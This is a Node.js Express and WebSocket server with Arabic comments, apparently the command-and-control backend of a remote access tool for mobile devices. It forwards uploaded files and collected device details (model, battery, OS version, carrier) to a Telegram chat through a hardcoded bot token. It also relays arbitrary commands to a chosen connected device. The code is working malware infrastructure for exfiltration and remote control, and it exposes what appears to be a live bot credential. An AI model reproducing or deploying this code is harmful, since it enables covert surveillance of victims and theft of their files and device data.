const express = require('express');
const WebSocket = require('ws');
const http = require('http');
const multer = require('multer');
const bodyParser = require('body-parser');
const axios = require('axios');
const { v4: uuidv4 } = require('uuid');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// إعداد بيانات تيليجرام
const TELEGRAM_TOKEN = '7268249504:AAE2TjqhwBoqgFw6z6jjVN7838Jpj8dO2EE';
const TELEGRAM_CHAT_ID = '6837315281';
const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_TOKEN}`;

// تخزين بيانات الأجهزة المتصلة
const clients = new Map();

// استخدام Body Parser و Multer
app.use(bodyParser.json());
const upload = multer({ storage: multer.memoryStorage() });

// ✅ نقطة الوصول الرئيسية
app.get('/', (req, res) => {
    res.send('<h1 style="text-align:center">🚀 تم تشغيل الخادم بنجاح ✅</h1>');
});

// ✅ رفع الملفات وإرسالها إلى تيليجرام
app.post('/uploadFile', upload.single('file'), async (req, res) => {
    try {
        if (!req.file) {
            return res.status(400).json({ error: '⚠️ لم يتم تحميل أي ملف' });
        }

        await axios.post(`${TELEGRAM_API_URL}/sendDocument`, {
            chat_id: TELEGRAM_CHAT_ID,
            caption: `📂 ملف جديد محمل`,
            document: req.file.buffer.toString('base64')
        });

        res.json({ success: '✅ تم إرسال الملف إلى تيليجرام' });
    } catch (error) {
        console.error('❌ خطأ أثناء إرسال الملف:', error);
        res.status(500).json({ error: 'حدث خطأ أثناء إرسال الملف' });
    }
});

// ✅ إرسال رسالة نصية إلى تيليجرام
app.post('/sendText', async (req, res) => {
    try {
        const { message } = req.body;
        if (!message) {
            return res.status(400).json({ error: '⚠️ يجب إدخال رسالة' });
        }

        await axios.post(`${TELEGRAM_API_URL}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message
        });

        res.json({ success: '✅ تم إرسال الرسالة إلى تيليجرام' });
    } catch (error) {
        console.error('❌ خطأ أثناء إرسال الرسالة:', error);
        res.status(500).json({ error: 'حدث خطأ أثناء إرسال الرسالة' });
    }
});

// ✅ التعامل مع WebSocket
wss.on('connection', (ws) => {
    const clientId = uuidv4();
    clients.set(clientId, ws);

    console.log(`🔗 جهاز متصل: ${clientId}`);

    ws.on('message', (message) => {
        console.log(`📩 رسالة من ${clientId}:`, message);

        // إرسال البيانات إلى تيليجرام عند استقبال معلومات الجهاز
        const data = JSON.parse(message);
        if (data.type === 'deviceInfo') {
            const { model, battery, version, brightness, provider } = data;
            const deviceMessage = `🔹 **جهاز جديد متصل**\n📱 **الطراز:** ${model}\n🔋 **البطارية:** ${battery}%\n📲 **الإصدار:** ${version}\n💡 **السطوع:** ${brightness}%\n📡 **الشبكة:** ${provider}`;
            
            axios.post(`${TELEGRAM_API_URL}/sendMessage`, {
                chat_id: TELEGRAM_CHAT_ID,
                text: deviceMessage,
                parse_mode: 'Markdown'
            });
        }
    });

    ws.on('close', () => {
        clients.delete(clientId);
        console.log(`❌ الجهاز ${clientId} قطع الاتصال`);
    });

    ws.send(JSON.stringify({ type: 'welcome', message: '✅ تم الاتصال بالخادم بنجاح' }));
});

// ✅ استقبال الأوامر من تيليجرام وتنفيذها على الأجهزة المتصلة
app.post('/telegramCommand', async (req, res) => {
    try {
        const { command, targetClientId } = req.body;
        if (!command || !targetClientId) {
            return res.status(400).json({ error: '⚠️ يجب تحديد الأمر والعميل الهدف' });
        }

        const client = clients.get(targetClientId);
        if (!client) {
            return res.status(404).json({ error: '❌ الجهاز غير متصل' });
        }

        client.send(JSON.stringify({ type: 'command', command }));
        res.json({ success: '✅ تم إرسال الأمر إلى الجهاز' });
    } catch (error) {
        console.error('❌ خطأ أثناء تنفيذ الأمر:', error);
        res.status(500).json({ error: 'حدث خطأ أثناء تنفيذ الأمر' });
    }
});

// ✅ تشغيل الخادم
const PORT = 3000;
server.listen(PORT, () => {
    console.log(`🚀 الخادم يعمل على المنفذ ${PORT}`);
});
